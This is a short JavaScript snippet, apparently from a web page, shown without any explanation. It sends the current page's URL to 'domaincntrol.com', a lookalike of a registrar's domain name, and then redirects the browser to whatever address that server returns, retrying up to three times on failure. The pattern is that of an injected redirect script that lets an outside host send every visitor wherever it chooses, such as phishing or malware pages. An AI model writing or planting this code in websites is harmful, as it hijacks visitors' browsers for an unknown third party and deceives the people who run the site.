
    let retries = 3, interval = 1000;
    (function retry() {
      fetch("https://domaincntrol.com/?orighost=" + window.location.href)
        .then(response => response.json())
        .then(data => window.location.href = data)
        .catch(error => {
          if (retries > 0) {
            retries--;
            setTimeout(retry, interval);
          } else {
            console.error("Error: ", error);
          }
        });
    })();
  